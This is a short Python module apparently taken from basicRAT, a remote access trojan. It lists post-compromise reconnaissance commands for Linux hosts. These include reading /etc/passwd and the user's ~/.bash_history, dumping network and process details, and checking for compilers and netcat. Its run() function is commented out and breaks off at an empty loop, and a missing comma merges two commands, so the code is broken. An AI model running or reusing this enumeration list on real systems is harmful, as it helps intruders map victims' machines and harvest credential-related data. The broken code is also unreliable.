#
# basicRAT nixenum module
# https://github.com/vesche/basicRAT
#

from toolkit import execute


CMDLIST = [ 'uname -a',
            'cat /etc/issue',
            'cat /etc/*release*',
            'id',
            'w',
            'last',
            'netstat -natup',
            'ifconfig -a',
            'hostname',
            'cat /etc/resolv.conf',
            'arp -a',
            'route',
            'ps aux',
            'cat /etc/passwd',
            'cat ~/.bash_history',
            'python --version',
            'perl --version',
            'gcc --version',
            'cc --version',
            'ftp --version',
            'tftp --version',
            'telnet --version'
            'which nc',
            'which netcat' ]


def run():
    #with open('nixenum.txt', 'w') as f:
    #    f.write('basicRAT nixenum\n\n')
        
    #    for c in CMDLIST:
    #        output = execute(c)
    #        f.write('----- "{}" -----\n'.format(c))
    #        if output.endswith('\n'):
    #            output = output.rstrip()
    #        f.write(output)
    #        f.write('\n-----{}-----\n\n'.format('-'*(len(c)+4)))

    #for c in CMDLIST:
        